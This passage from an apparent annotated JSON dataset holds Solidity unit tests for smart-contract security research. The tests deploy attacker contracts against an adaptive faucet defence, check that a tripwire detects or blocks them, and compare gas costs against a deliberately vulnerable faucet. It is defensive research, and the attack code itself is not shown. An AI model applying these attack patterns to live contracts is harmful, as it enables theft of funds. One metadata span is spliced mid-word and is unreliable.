docs","internal":"tests/260620_attacker_test/attack1_test.sol","url":"https://remix-ide.readthedocs.io/en/latest/unittesting.html"}],"tags":[],"jp":{"title":"False Positive検証","purpose":"実行後の状態が研究上の期待値と一致するかをAssertで機械的に確認するブロック。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Research specificity conclusion","experiments":"Experiment 4"}}],"role_ja":"Experiment 4: False Positive"},{"group":"tests","name":"attack5_test.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\nimport \"remix_tests.sol\";\nimport \"hardhat/console.sol\";\nimport \"../02_CONTRACTS/SentinelToken.sol\";\nimport \"../02_CONTRACTS/AdaptiveFaucet.sol\";\nimport \"../02_CONTRACTS/Accomplice.sol\";\nimport \"../02_CONTRACTS/attacker.sol\";\n\ncontract Attack5_test {\n    receive() external payable {}\n\n    /// #value: 3000000000000000000\n    function beforeAll() public payable {\n        // 実験用Etherを準備する。\n        require(address(this).balance >= 2 ether, \"Test contract not funded\");\n    }\n\n    function testDifferentAttackerAddress() public {\n        // 学習済みルールが別のAttacker addressにも適用されることを確認する。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 2;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        AdaptiveFaucet faucet = new AdaptiveFaucet(address(pass));\n        pass.setFaucet(address(faucet));\n\n        Accomplice accomplice = new Accomplice(address(faucet), address(pass));\n        TokenMoveAttacker attackerOne =\n            new TokenMoveAttacker(address(faucet), address(pass), address(accomplice));\n        TokenMoveAttacker attackerTwo =\n            new TokenMoveAttacker(address(faucet), address(pass), address(accomplice));\n\n        (bool success, ) = address(faucet).call{value: 1 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        pass.transfer(address(attackerOne), 1);\n        pass.transfer(address(attackerTwo), 1);\n\n        console.log(\"Generalization test - faucet before attacks:\", faucet.getBalance());\n\n        attackerOne.attack();\n\n        console.log(\"Generalization test - trips after attacker one:\", faucet.totalTrips());\n        console.log(\"Generalization test - attacker one Ether:\", attackerOne.getBalance());\n\n        attackerTwo.attack();\n\n        console.log(\"Generalization test - attacker two Ether:\", attackerTwo.getBalance());\n        console.log(\"Generalization test - attacker two move blocked:\", attackerTwo.passMoveBlocked());\n        console.log(\"Generalization test - early preventions:\", pass.earlyPreventions());\n        console.log(\"Generalization test - total trips final:\", faucet.totalTrips());\n        console.log(\"Generalization test - faucet final:\", faucet.getBalance());\n\n        Assert.ok(attackerTwo.passMoveBlocked(), \"Second attacker should be blocked\");\n        Assert.equal(faucet.totalTrips(), uint(1), \"Only first attack should trip late\");\n    }\n\n    function testMoveAndReturn() public {\n        // PASSが移動して戻っても移動履歴をTripwireが検知することを確認する。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 1;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        AdaptiveFaucet faucet = new AdaptiveFaucet(address(pass));\n        pass.setFaucet(address(faucet));\n\n        Accomplice accomplice = new Accomplice(address(faucet), address(pass));\n        MoveReturnAttacker attacker =\n            new MoveReturnAttacker(address(faucet), address(pass), address(accomplice));\n\n        (bool success, ) = address(faucet).call{value: 0.5 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        pass.transfer(address(attacker), 1);\n\n        console.log(\"Move-return test - faucet before:\", faucet.getBalance());\n        console.log(\"Move-return test - attacker PASS before:\", pass.balances(address(attacker)));\n        console.log(\"Move-return test - accomplice PASS before:\", pass.balances(address(accomplice)));\n\n        attacker.attack();\n\n        console.log(\"Move-return test - faucet after:\", faucet.getBalance());\n        console.log(\"Move-return test - attacker Ether after:\", attacker.getBalance());\n        console.log(\"Move-return test - attacker PASS after:\", pass.balances(address(attacker)));\n        console.log(\"Move-return test - accomplice PASS after:\", pass.balances(address(accomplice)));\n        console.log(\"Move-return test - total trips:\", faucet.totalTrips());\n        console.log(\"Move-return test - restriction active:\", pass.adaptiveRestriction());\n\n        Assert.equal(faucet.totalTrips(), uint(1), \"Move-return should trip once\");\n        Assert.equal(faucet.getBalance(), uint(0.5 ether), \"Ether should be restored\");\n        Assert.equal(pass.balances(address(attacker)), uint(1), \"PASS should be restored\");\n        Assert.equal(pass.balances(address(accomplice)), uint(0), \"Accomplice should keep no PASS\");\n        Assert.ok(pass.adaptiveRestriction(), \"Restriction should be enabled\");\n    }\n}\n","role":"Experiment 5: generalization + move-return evasion","priority":"HIGH","lesson":"Core research robustness experiment","blocks":[{"id":"attack5_test.sol:1-9","start":1,"end":9,"title":"Test header + imports","purpose":"Loads Adaptive components for different-address generalization and move-return tests.","priority":"MEDIUM","lesso  values while totalTrips becomes one and restriction activates.","priority":"HIGH","lesson":"Research one-way history signal","confidence":"確定","origin":"Core research evidence","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"Experiment 5 move-return","rose":["If final balances are the same as before, what evidence tells the Tripwire something happened?","Why is Faucet balance still 0.5 ETH?"],"sources":[{"label":"Adaptive Sentinel research-specific logic","internal":"01_REFERENCE_MATERIALS/01_04_Formal_Research_Proposal.pdf","url":null},{"label":"Code origin map","internal":"06_DOCUMENTATION/06_03_Code_Origin_and_Modification_Map.md","url":null},{"label":"Remix Solidity Unit Testing — course pattern + official docs","internal":"tests/260620_attacker_test/attack1_test.sol","url":"https://remix-ide.readthedocs.io/en/latest/unittesting.html"}],"tags":[],"jp":{"title":"Move-Return証拠 + 検証","purpose":"実行後の状態が研究上の期待値と一致するかをAssertで機械的に確認するブロック。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Research one-way history signal","experiments":"Experiment 5 move-return"}}],"role_ja":"Experiment 5: Generalization + Move-Return"},{"group":"tests","name":"gas_test.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\nimport \"remix_tests.sol\";\nimport \"hardhat/console.sol\";\nimport \"../02_CONTRACTS/SentinelToken.sol\";\nimport \"../02_CONTRACTS/faucet3-vulnerable.sol\";\nimport \"../02_CONTRACTS/Faucet3Mutex.sol\";\nimport \"../02_CONTRACTS/AdaptiveFaucet.sol\";\nimport \"../02_CONTRACTS/Accomplice.sol\";\nimport \"../02_CONTRACTS/attacker.sol\";\n\ncontract Gas_test {\n    receive() external payable {}\n\n    /// #value: 4000000000000000000\n    function beforeAll() public payable {\n        // gas測定用Etherを準備する。\n        require(address(this).balance >= 3 ether, \"Test contract not funded\");\n    }\n\n    function testVulnerableNormalClaimGas() public {\n        // Vulnerable Faucetの通常withdrawで使うgasを測る。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 1;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        Faucet3 faucet = new Faucet3(address(pass));\n        (bool success, ) = address(faucet).call{value: 0.5 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        uint gasAtStart = gasleft();\n        faucet.withdraw(0.1 ether);\n        uint gasAtEnd = gasleft();\n        uint gasUsed = gasAtStart - gasAtEnd;\n\n        console.log(\"Gas test - Vulnerable normal withdraw gas:\", gasUsed);\n        console.log(\"Gas test - Vulnerable faucet after withdraw:\", faucet.getBalance());\n        Assert.ok(gasUsed > 0, \"gas should be recorded\");\n    }\n\n    function testMutexNormalClaimGas() public {\n        // Mutex Faucetの通常withdrawで使うgasを測る。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 1;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        Faucet3Mutex faucet = new Faucet3Mutex(address(pass));\n        (bool success, ) = address(faucet).call{value: 0.5 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        uint gasAtStart = gasleft();\n        faucet.withdraw(0.1 ether);\n        uint gasAtEnd = gasleft();\n        uint gasUsed = gasAtStart - gasAtEnd;\n\n        console.log(\"Gas test - Mutex normal withdraw gas:\", gasUsed);\n        console.log(\"Gas test - Mutex faucet after withdraw:\", faucet.getBalance());\n        Assert.ok(gasUsed > 0, \"gas should be recorded\");\n    }\n\n    function testAdaptiveNormalClaimGas() public {\n        // Adaptive Faucetの通常withdrawで使うgasを測る。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 1;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        AdaptiveFaucet faucet = new AdaptiveFaucet(address(pass));\n        pass.setFaucet(address(faucet));\n        (bool success, ) = address(faucet).call{value: 0.5 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        uint gasAtStart = gasleft();\n        faucet.withdraw(0.1 ether);\n        uint gasAtEnd = gasleft();\n        uint gasUsed = gasAtStart - gasAtEnd;\n\n        console.log(\"Gas test - Adaptive normal withdraw gas:\", gasUsed);\n        console.log(\"Gas test - Adaptive faucet after withdraw:\", faucet.getBalance());\n        console.log(\"Gas test - Adaptive total trips:\", faucet.totalTrips());\n        Assert.ok(gasUsed > 0, \"gas should be recorded\");\n    }\n\n    function testAdaptiveThreatGas() public {\n        // 一回目の検知と二回目の早期防御で使うgasを測る。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 2;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        AdaptiveFaucet faucet = new AdaptiveFaucet(address(pass));\n        pass.setFaucet(address(faucet));\n\n        Accomplice accomplice = new Accomplice(address(faucet), address(pass));\n        TokenMoveAttacker firstAttacker =\n            new TokenMoveAttacker(address(faucet), address(pass), address(accomplice));\n        TokenMoveAttacker secondAttacker =\n            new TokenMoveAttacker(address(faucet), address(pass), address(accomplice));\n\n        (bool success, ) = address(faucet).call{value: 1 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        pass.transfer(address(firstAttacker), 1);\n        pass.transfer(address(secondAttacker), 1);\n\n        uint gasAtStart = gasleft();\n        firstAttacker.attack();\n        uint gasAtEnd = gasleft();\n        uint firstGasUsed = gasAtStart - gasAtEnd;\n\n        gasAtStart = gasleft();\n        secondAttacker.attack();\n        gasAtEnd = gasleft();\n        uint secondGasUsed = gasAtStart - gasAtEnd;\n\n        console.log(\"Gas test - First late detection gas:\", firstGasUsed);\n        console.log(\"Gas test - Early prevention gas:\", secondGasUsed);\n        console.log(\"Gas test - Threat total trips:\", faucet.totalTrips());\n        console.log(\"Gas test - Early prevention count:\", pass.earlyPreventions());\n\n        Assert.ok(firstGasUsed > 0, \"first gas should be recorded\");\n        Assert.ok(secondGasUsed > 0, \"second gas should be recorded\");\n    }\n}\n","role":"Experiment 6: gas/efficiency comparison","priority":"HIGH","lesson":"gasleft pattern + research benchmark","blocks":[{"id":"gas_test.sol:1-11","start":1,"end":11,"title":"Test header + imports","purpose":"Loads every contract needed to benchmark normal withdrawal and adaptive threat paths.","priority":"MEDIUM","lesson":"Remix Solidity Unit Testing / course tests","confidence":"確定","origin":"Course testing pattern + experiment imports","required":"Imports are required by the test file references; compiler metadata is required as usual.","remove":"Removing a used import causes unresolved symbols or missing console/assert support.","rename":"File paths are literals; imported contract names must match source declarations.","experiments":"","rose":[],"sources":[{"label":"Remix Solidity Unit Testing — course pattern + official docs","internal":"tests/260620_attacker_test/attack1_test.sol","url":"https://remix-ide.readthedocs.io/en/latest/unittesting.html"},{"label":"Hardhat console.log in Remix — external tool documentation","internal":null,"url":"https://remix-ide.readthedocs.io/en/late
